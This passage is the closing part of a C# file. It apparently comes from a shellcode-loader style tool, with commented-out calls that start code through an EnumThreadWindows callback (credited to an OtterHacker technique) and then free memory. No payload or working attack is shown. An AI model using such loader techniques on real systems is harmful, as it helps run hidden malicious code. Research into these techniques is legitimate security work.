             * static extern bool EnumThreadWindows(uint dwThreadId, EnumThreadDelegate lpfn, IntPtr lParam)
             */

            // Technique: https://twitter.com/OtterHacker/status/1587431364835639297
            // Link: https://learn.microsoft.com/en-us/dotnet/csharp/misc/cs0149
            // https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-enumthreadwindows
            // https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms633496(v=vs.85)
            // pinvoke: http://www.pinvoke.net/default.aspx/user32/enumthreadwindows.html

            //EnumThreadDelegate dt;

            //dt = new EnumThreadDelegate(Func2);

            //EnumThreadWindows(threadid, new EnumThreadDelegate(varai, IntPtr.Zero), IntPtr.Zero);

            #endregion End: KickOff

            // MEM_RELEASE: 0x00008000
            //bool status = VirtualFree(baseaddr, 0, 0x00008000);

            ////Console.WriteLine("status: {0}", status);
            //if (status == false)
            //{
            //    Console.WriteLine("Failed!\n{0}", GetLastError());
            //    Environment.Exit(0);
            //}
            //Console.WriteLine("\nMemory Freed!");

            //Console.ReadKey();
        }
    }
}
